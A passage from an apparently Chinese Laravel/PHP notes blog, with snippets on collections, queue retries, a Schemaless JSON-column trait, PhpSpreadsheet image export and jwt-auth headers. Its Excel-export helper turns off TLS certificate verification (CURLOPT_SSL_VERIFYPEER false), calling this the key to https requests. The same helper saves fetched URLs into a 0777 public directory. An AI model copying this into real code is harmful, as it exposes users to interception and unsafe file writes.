class="string">'Dan'</span>, <span class="string">'Eric'</span>, <span class="string">'Xavier'</span>, <span class="string">'Yuri'</span>, <span class="string">'Zane'</span></span><br><span class="line">                                    ]);</span><br><span class="line">                            </span><br><span class="line">                                    $chunks = $list-&gt;chunk(<span class="number">3</span>);</span><br><span class="line">                                    $chunks-&gt;toArray();</span><br><span class="line">                                    <span class="comment">/*</span></span><br><span class="line"><span class="comment">                                    [</span></span><br><span class="line"><span class="comment">                                        ["Albert", "Ben", "Charles",],</span></span><br><span class="line"><span class="comment">                                        [3 =&gt; "Dan", 4 =&gt; "Eric", 5 =&gt; "Xavier",],</span></span><br><span class="line"><span class="comment">                                        [6 =&gt; "Yuri", 7 =&gt; "Zane",],</span></span><br><span class="line"><span class="comment">                                    ]</span></span><br><span class="line"><span class="comment">                                    */</span></span><br><span class="line">                                     $names = collect([</span><br><span class="line">                                                <span class="string">'Albert'</span>, <span class="string">'Ben'</span>, <span class="string">'Charles'</span>, <span class="string">'Dan'</span>, <span class="string">'Eric'</span>, <span class="string">'Xavier'</span>, <span class="string">'Yuri'</span>, <span class="string">'Zane'</span></span><br><span class="line">                                            ]);</span><br><span class="line">                                    </span><br><span class="line">                                            $names-&gt;transform(<span class="function"><span class="keyword">function</span> (<span class="params">$name, $key</span>) </span>&#123;</span><br><span class="line">                                                <span class="keyword">return</span> strlen($name);</span><br><span class="line">                                            &#125;);</span><br><span class="line">                                    </span><br><span class="line">                                            $names-&gt;toArray();</span><br><span class="line">                                            <span class="comment">//[6, 3, 7, 3, 4, 6, 4, 4,]</span></span><br><span class="line">                                             $names = collect([</span><br><span class="line">                                                        <span class="string">'Albert'</span>, <span class="string">'Ben'</span>, <span class="string">'Charles'</span>, <span class="string">'Dan'</span>, <span class="string">'Eric'</span>, <span class="string">'Xavier'</span>, <span class="string">'Yuri'</span>, <span class="string">'Zane'</span></span><br><span class="line">                                                    ]);</span><br><span class="line">                                            </span><br><span class="line">                                                    $names-&gt;transform(<span class="function"><span class="keyword">function</span> (<span class="params">$name, $key</span>) </span>&#123;</span><br><span class="line">                                                        <span class="keyword">return</span> strlen($name);</span><br><span class="line">                                                    &#125;);</span><br><span class="line">                                            </span><br><span class="line">                                                    $names-&gt;toArray();</span><br><span class="line">                                                    <span class="comment">//[6, 3, 7, 3, 4, 6, 4, 4,]</span></span><br></pre></td></tr></table></figure>
<h3 id="队列执行失败反复执行"><a href="#队列执行失败反复执行" class="headerlink" title="队列执行失败反复执行"></a>队列执行失败反复执行</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">由于报错或者什么原因队列执行失败，但是队列的 attempts一直为<span class="number">1</span>，可以手动<span class="keyword">throw</span></span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">catch</span> (\Throwable $e) &#123;</span><br><span class="line">  <span class="keyword">throw</span> <span class="keyword">new</span> \Exception(<span class="string">"queue fail"</span>);</span><br><span class="line">&#125;</span><br><span class="line">php artisan xx --tries=<span class="number">2</span></span><br></pre></td></tr></table></figure>
<h3 id="实现Schemaless"><a href="#实现Schemaless" class="headerlink" title="实现Schemaless"></a>实现Schemaless</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; CREATE TABLE users (</span><br><span class="line">           id INT UNSIGNED NOT NULL AUTO_INCREMENT,</span><br><span class="line">           created_at timestamp <span class="literal">null</span>,</span><br><span class="line">           updated_at timestamp <span class="literal">null</span>,</span><br><span class="line">           data <span class="built_in">JSON</span> NOT NULL,</span><br><span class="line">           PRIMARY KEY(id)</span><br><span class="line">       );</span><br><span class="line"></span><br><span class="line">mysql&gt; ALTER TABLE users add name VARCHAR(<span class="number">100</span>) AS</span><br><span class="line">       (JSON_UNQUOTE(JSON_EXTRACT(data, <span class="string">'$.name'</span>))) AFTER id;</span><br><span class="line"></span><br><span class="line">mysql&gt; ALTER TABLE users add address VARCHAR(<span class="number">100</span>) AS</span><br><span class="line">       (JSON_UNQUOTE(JSON_EXTRACT(data, <span class="string">'$.address'</span>))) AFTER name;</span><br><span class="line"></span><br><span class="line">mysql&gt; ALTER TABLE users add level INT UNSIGNED AS</span><br><span class="line">       (JSON_EXTRACT(data, <span class="string">'$.level'</span>)) AFTER name;</span><br><span class="line">然后是核心代码 Schemaless.php，以 trait 的方式实现：https:<span class="comment">//huoding.com/2017/01/14/590 </span></span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">namespace App;</span><br><span class="line"></span><br><span class="line">trait Schemaless</span><br><span class="line">&#123;</span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">getDirty</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $dirty = collect(parent::getDirty());</span><br><span class="line"></span><br><span class="line">        $keys = $dirty-&gt;keys()-&gt;map(<span class="function"><span class="keyword">function</span>(<span class="params">$key</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (in_array($key, $<span class="keyword">this</span>-&gt;virtual)) &#123;</span><br><span class="line">                $key = $<span class="keyword">this</span>-&gt;getDataColumn() . <span class="string">'-&gt;'</span> . $key;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> $key;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $keys-&gt;combine($dirty)-&gt;all();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">save</span>(<span class="params">array $options = []</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!$<span class="keyword">this</span>-&gt;exists) &#123;</span><br><span class="line">            $attributes = collect($<span class="keyword">this</span>-&gt;getAttributes());</span><br><span class="line"></span><br><span class="line">            $virtual = $attributes-&gt;only($<span class="keyword">this</span>-&gt;virtual);</span><br><span class="line"></span><br><span class="line">            $attributes = $attributes-&gt;diffKeys($virtual)-&gt;merge([</span><br><span class="line">                $<span class="keyword">this</span>-&gt;getDataColumn() =&gt; json_encode($virtual-&gt;all()),</span><br><span class="line">            ]);</span><br><span class="line"></span><br><span class="line">            $<span class="keyword">this</span>-&gt;setRawAttributes($attributes-&gt;all());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> parent::save($options);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">getDataColumn</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">static</span> $column;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($column === <span class="literal">null</span>) &#123;</span><br><span class="line">            $column = defined(<span class="string">'static::DATA'</span>) ? <span class="keyword">static</span>::DATA : <span class="string">'data'</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $column;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">接着是 Model 实现 User.php，里面激活了 schemaless，并设置了虚拟字段：</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">namespace App;</span><br><span class="line"></span><br><span class="line">use Illuminate\Database\Eloquent\Model;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    use Schemaless;</span><br><span class="line"></span><br><span class="line">    protected $virtual = [<span class="string">'name'</span>, <span class="string">'address'</span>, <span class="string">'level'</span>];</span><br><span class="line"></span><br><span class="line">    protected $hidden = [<span class="string">'data'</span>];</span><br><span class="line">&#125;</span><br><span class="line">最后是 Controller 实现 UsersController.php，里面演示了如何创建和修改：</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">namespace App\Http\Controllers;</span><br><span class="line"></span><br><span class="line">use Illuminate\Http\Request;</span><br><span class="line">use App\User;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UsersController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">User $user</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;user = $user;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">store</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $user = $<span class="keyword">this</span>-&gt;user;</span><br><span class="line"></span><br><span class="line">        $user-&gt;name = <span class="string">'老王'</span>;</span><br><span class="line">        $user-&gt;address = <span class="string">'东北'</span>;</span><br><span class="line">        $user-&gt;level = <span class="number">1</span>;</span><br><span class="line">        $user-&gt;save();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">update</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $user = $<span class="keyword">this</span>-&gt;user-&gt;find(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        $user-&gt;address = <span class="string">'北京'</span>;</span><br><span class="line">        $user-&gt;save();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="PhpSpreadsheet-导出图片到-Excel"><a href="#PhpSpreadsheet-导出图片到-Excel" class="headerlink" title="PhpSpreadsheet 导出图片到 Excel"></a>PhpSpreadsheet 导出图片到 Excel</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line">public <span class="function"><span class="keyword">function</span> <span class="title">export</span>(<span class="params">$data</span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       $spreadsheet = <span class="keyword">new</span> Spreadsheet();</span><br><span class="line">       $sheet = $spreadsheet-&gt;getActiveSheet();</span><br><span class="line">       <span class="comment">//设置sheet的名字  两种方法 https://learnku.com/articles/26965</span></span><br><span class="line">       $sheet-&gt;setTitle(<span class="string">'phpspreadsheet——demo'</span>);</span><br><span class="line">       $spreadsheet-&gt;getActiveSheet()-&gt;setTitle(<span class="string">'Hello'</span>);</span><br><span class="line">       <span class="comment">//设置第一行小标题</span></span><br><span class="line">       $k = <span class="number">1</span>;</span><br><span class="line">       $sheet-&gt;setCellValue(<span class="string">'A'</span> . $k, <span class="string">'问题'</span>);</span><br><span class="line">       $sheet-&gt;setCellValue(<span class="string">'B'</span> . $k, <span class="string">'选项'</span>);</span><br><span class="line">       $sheet-&gt;setCellValue(<span class="string">'C'</span> . $k, <span class="string">'答案'</span>);</span><br><span class="line">       $sheet-&gt;setCellValue(<span class="string">'D'</span> . $k, <span class="string">'图片'</span>);</span><br><span class="line"></span><br><span class="line">       <span class="comment">// 设置个表格宽度</span></span><br><span class="line">       $spreadsheet-&gt;getActiveSheet()-&gt;getColumnDimension(<span class="string">'A'</span>)-&gt;setWidth(<span class="number">16</span>);</span><br><span class="line">       $spreadsheet-&gt;getActiveSheet()-&gt;getColumnDimension(<span class="string">'B'</span>)-&gt;setWidth(<span class="number">80</span>);</span><br><span class="line">       $spreadsheet-&gt;getActiveSheet()-&gt;getColumnDimension(<span class="string">'C'</span>)-&gt;setWidth(<span class="number">15</span>);</span><br><span class="line">       $spreadsheet-&gt;getActiveSheet()-&gt;getColumnDimension(<span class="string">'D'</span>)-&gt;setWidth(<span class="number">20</span>);</span><br><span class="line"></span><br><span class="line">       <span class="comment">// 垂直居中</span></span><br><span class="line">       $spreadsheet-&gt;getActiveSheet()-&gt;getStyle(<span class="string">'A'</span>)-&gt;getAlignment()-&gt;setVertical(\PhpOffice\PhpSpreadsheet\Style\Alignment::VERTICAL_CENTER);</span><br><span class="line">       $spreadsheet-&gt;getActiveSheet()-&gt;getStyle(<span class="string">'B'</span>)-&gt;getAlignment()-&gt;setVertical(\PhpOffice\PhpSpreadsheet\Style\Alignment::VERTICAL_CENTER);</span><br><span class="line">       $spreadsheet-&gt;getActiveSheet()-&gt;getStyle(<span class="string">'C'</span>)-&gt;getAlignment()-&gt;setVertical(\PhpOffice\PhpSpreadsheet\Style\Alignment::VERTICAL_CENTER);</span><br><span class="line">       $spreadsheet-&gt;getActiveSheet()-&gt;getStyle(<span class="string">'D'</span>)-&gt;getAlignment()-&gt;setVertical(\PhpOffice\PhpSpreadsheet\Style\Alignment::VERTICAL_CENTER);</span><br><span class="line"></span><br><span class="line">       $info = $data;</span><br><span class="line">       <span class="comment">//  设置A单元格的宽度 同理设置每个</span></span><br><span class="line">       $spreadsheet-&gt;getActiveSheet()-&gt;getColumnDimension(<span class="string">'A'</span>)-&gt;setWidth(<span class="number">20</span>);</span><br><span class="line">       <span class="comment">//  设置第三行的高度</span></span><br><span class="line">       $spreadsheet-&gt;getActiveSheet()-&gt;getRowDimension(<span class="string">'3'</span>)-&gt;setRowHeight(<span class="number">50</span>);</span><br><span class="line">       <span class="comment">//  A1水平居中</span></span><br><span class="line">       $styleArray = [</span><br><span class="line">           <span class="string">'alignment'</span> =&gt; [</span><br><span class="line">               <span class="string">'horizontal'</span> =&gt; \PhpOffice\PhpSpreadsheet\Style\Alignment::HORIZONTAL_CENTER,</span><br><span class="line">           ],</span><br><span class="line">       ];</span><br><span class="line">       $sheet-&gt;getStyle(<span class="string">'A1'</span>)-&gt;applyFromArray($styleArray);</span><br><span class="line">       <span class="comment">//  将A3到D4合并成一个单元格</span></span><br><span class="line">       $spreadsheet-&gt;getActiveSheet()-&gt;mergeCells(<span class="string">'A3:D4'</span>);</span><br><span class="line">       <span class="comment">//  拆分合并单元格</span></span><br><span class="line">       $spreadsheet-&gt;getActiveSheet()-&gt;unmergeCells(<span class="string">'A3:D4'</span>);</span><br><span class="line">       <span class="comment">//  将A2到D8表格边框 改变为红色</span></span><br><span class="line">       $styleArray = [</span><br><span class="line">           <span class="string">'borders'</span> =&gt; [</span><br><span class="line">               <span class="string">'outline'</span> =&gt; [</span><br><span class="line">                   <span class="string">'borderStyle'</span> =&gt; \PhpOffice\PhpSpreadsheet\Style\Border::BORDER_THICK,</span><br><span class="line">                   <span class="string">'color'</span> =&gt; [<span class="string">'argb'</span> =&gt; <span class="string">'FFFF0000'</span>],</span><br><span class="line">               ],</span><br><span class="line">           ],</span><br><span class="line">       ];</span><br><span class="line">       <span class="comment">//  $sheet-&gt;getStyle('A2:E8')-&gt;applyFromArray($styleArray);</span></span><br><span class="line">       <span class="comment">//  设置超链接</span></span><br><span class="line">       <span class="comment">//  $sheet-&gt;setCellValue('D6', 'www.baidu.com');</span></span><br><span class="line">       <span class="comment">//  $spreadsheet-&gt;getActiveSheet()-&gt;setCellValue('E6', 'www.baidu.com');</span></span><br><span class="line">       <span class="comment">//  循环赋值</span></span><br><span class="line">       $k = <span class="number">2</span>;</span><br><span class="line">       foreach ($info <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">           $sheet-&gt;setCellValue(<span class="string">'A'</span> . $k, $value[<span class="string">'question'</span>]);</span><br><span class="line">           $sheet-&gt;setCellValue(<span class="string">'B'</span> . $k, $value[<span class="string">'question_options'</span>]);</span><br><span class="line">           $sheet-&gt;setCellValue(<span class="string">'C'</span> . $k, $value[<span class="string">'answer'</span>]);</span><br><span class="line"></span><br><span class="line">           $img = self::curlGet($value[<span class="string">'img'</span>]);</span><br><span class="line">           $dir = public_path(<span class="string">'/temp/image/'</span>);</span><br><span class="line">           $file_info = pathinfo($value[<span class="string">'img'</span>]);</span><br><span class="line">           <span class="keyword">if</span> (!empty($file_info[<span class="string">'basename'</span>])) &#123; <span class="comment">//过滤非文件类型</span></span><br><span class="line">               $basename = $file_info[<span class="string">'basename'</span>];</span><br><span class="line">               is_dir($dir) OR mkdir($dir, <span class="number">0777</span>, <span class="literal">true</span>); <span class="comment">//进行检测文件是否存在</span></span><br><span class="line">               file_put_contents($dir . $basename, $img);</span><br><span class="line"></span><br><span class="line">               $drawing[$k] = <span class="keyword">new</span> Drawing();</span><br><span class="line">               $drawing[$k]-&gt;setName(<span class="string">'Logo'</span>);</span><br><span class="line">               $drawing[$k]-&gt;setDescription(<span class="string">'Logo'</span>);</span><br><span class="line">               $drawing[$k]-&gt;setPath($dir . $basename);</span><br><span class="line">               $drawing[$k]-&gt;setWidth(<span class="number">80</span>);</span><br><span class="line">               $drawing[$k]-&gt;setHeight(<span class="number">80</span>);</span><br><span class="line">               $drawing[$k]-&gt;setCoordinates(<span class="string">'D'</span>.$k);</span><br><span class="line">               $drawing[$k]-&gt;setOffsetX(<span class="number">12</span>);</span><br><span class="line">               $drawing[$k]-&gt;setOffsetY(<span class="number">12</span>);</span><br><span class="line">               $drawing[$k]-&gt;setWorksheet($spreadsheet-&gt;getActiveSheet());</span><br><span class="line">           &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">               $sheet-&gt;setCellValue(<span class="string">'D'</span> . $k, <span class="string">''</span>);</span><br><span class="line">           &#125;</span><br><span class="line">           $sheet-&gt;getRowDimension($k)-&gt;setRowHeight(<span class="number">80</span>);</span><br><span class="line">           $k++;</span><br><span class="line">       &#125;</span><br><span class="line">       $file_name = date(<span class="string">'Y-m-d'</span>, time()) . rand(<span class="number">1000</span>, <span class="number">9999</span>);</span><br><span class="line">       <span class="comment">//  第一种保存方式</span></span><br><span class="line">       <span class="comment">/*$writer = new Xlsx($spreadsheet);</span></span><br><span class="line"><span class="comment">       //保存的路径可自行设置</span></span><br><span class="line"><span class="comment">       $file_name = '../'.$file_name . ".xlsx";</span></span><br><span class="line"><span class="comment">       $writer-&gt;save($file_name);*/</span></span><br><span class="line">       <span class="comment">//  第二种直接页面上显示下载</span></span><br><span class="line">       $file_name = $file_name . <span class="string">".xls"</span>;</span><br><span class="line">       header(<span class="string">'Content-Type: application/vnd.ms-excel'</span>);</span><br><span class="line">       header(<span class="string">'Content-Disposition: attachment;filename="'</span> . $file_name . <span class="string">'"'</span>);</span><br><span class="line">       header(<span class="string">'Cache-Control: max-age=0'</span>);</span><br><span class="line">       $writer = IOFactory::createWriter($spreadsheet, <span class="string">'Xls'</span>);</span><br><span class="line">       <span class="comment">//  注意createWriter($spreadsheet, 'Xls') 第二个参数首字母必须大写</span></span><br><span class="line">       $writer-&gt;save(<span class="string">'php://output'</span>);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   public <span class="function"><span class="keyword">function</span> <span class="title">getClient</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">       $client = <span class="keyword">new</span> Client();</span><br><span class="line">       <span class="keyword">return</span> $client;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   public <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">curlGet</span>(<span class="params">$url</span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       $ch = curl_init();</span><br><span class="line">       curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">       curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">       curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">       curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, <span class="literal">false</span>); <span class="comment">// 这个是重点 请求https。</span></span><br><span class="line">       $data = curl_exec($ch);</span><br><span class="line">       curl_close($ch);</span><br><span class="line">       <span class="keyword">return</span> $data;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<h3 id="Laravel-集合的-“when”-方法"><a href="#Laravel-集合的-“when”-方法" class="headerlink" title="Laravel 集合的 “when” 方法"></a>Laravel 集合的 “when” 方法</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">$hosts = [</span><br><span class="line">    [<span class="string">'name'</span> =&gt; <span class="string">'Eric Barnes'</span>, <span class="string">'location'</span> =&gt; <span class="string">'USA'</span>, <span class="string">'is_active'</span> =&gt; <span class="number">0</span>],</span><br><span class="line">    [<span class="string">'name'</span> =&gt; <span class="string">'Jack Fruh'</span>, <span class="string">'location'</span> =&gt; <span class="string">'USA'</span>, <span class="string">'is_active'</span> =&gt; <span class="number">0</span>],</span><br><span class="line">    [<span class="string">'name'</span> =&gt; <span class="string">'Jacob Bennett'</span>, <span class="string">'location'</span> =&gt; <span class="string">'USA'</span>, <span class="string">'is_active'</span> =&gt; <span class="number">1</span>],</span><br><span class="line">    [<span class="string">'name'</span> =&gt; <span class="string">'Michael Dyrynda'</span>, <span class="string">'location'</span> =&gt; <span class="string">'AU'</span>, <span class="string">'is_active'</span> =&gt; <span class="number">1</span>],</span><br><span class="line">];</span><br><span class="line">以往，如果在一个查询语句上，还要有进一步的过滤条件，你可能需要这样写：</span><br><span class="line"></span><br><span class="line">$inUsa = collect($hosts)-&gt;where(<span class="string">'location'</span>, <span class="string">'USA'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (request(<span class="string">'retired'</span>)) &#123;</span><br><span class="line">    $inUsa = $inUsa-&gt;filter(<span class="function"><span class="keyword">function</span>(<span class="params">$employee</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ! $employee[<span class="string">'is_active'</span>];</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line">通过 when 方法，你就可以在一个链式查询中完成所有的筛选过滤：https:<span class="comment">//learnku.com/laravel/t/26331</span></span><br><span class="line"></span><br><span class="line">$inUsa = collect($hosts)</span><br><span class="line">    -&gt;where(<span class="string">'location'</span>, <span class="string">'USA'</span>)</span><br><span class="line">    -&gt;when(request(<span class="string">'retired'</span>), <span class="function"><span class="keyword">function</span>(<span class="params">$collection</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $collection-&gt;reject(<span class="function"><span class="keyword">function</span>(<span class="params">$employee</span>)</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> $employee[<span class="string">'is_active'</span>];</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure>
<h3 id="Jwtauth-自定义认证头信息"><a href="#Jwtauth-自定义认证头信息" class="headerlink" title="Jwtauth 自定义认证头信息"></a>Jwtauth 自定义认证头信息</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">项目使用的 tymon/jwt-auth 包作为 token 的认证，过程中需要迁移项目，因为之前公司的 token 头部使用自定义的，并且他们还修改了包的头信息。就是下面头部信息。</span><br><span class="line">https:<span class="comment">//learnku.com/articles/26976</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AuthHeaders</span> <span class="title">implements</span> <span class="title">ParserContract</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">// 下面这两处就是被修改的</span></span><br><span class="line">    protected $header = <span class="string">'authorization'</span>; </span><br><span class="line"></span><br><span class="line">    protected $prefix = <span class="string">'bearer'</span>;</span><br><span class="line">&#125;</span><br><span class="line">迁移项目过程了，因为拉取了新的包，所以还要去动包的信息，这是极其不合理的行为。所以就在包中尝试找到了更好的解决办法。如果在项目迁移过程中遇到了类似的问题该如何去做呢？这里只提供了我能想到的解决办法。需要在 AppServiceProvider 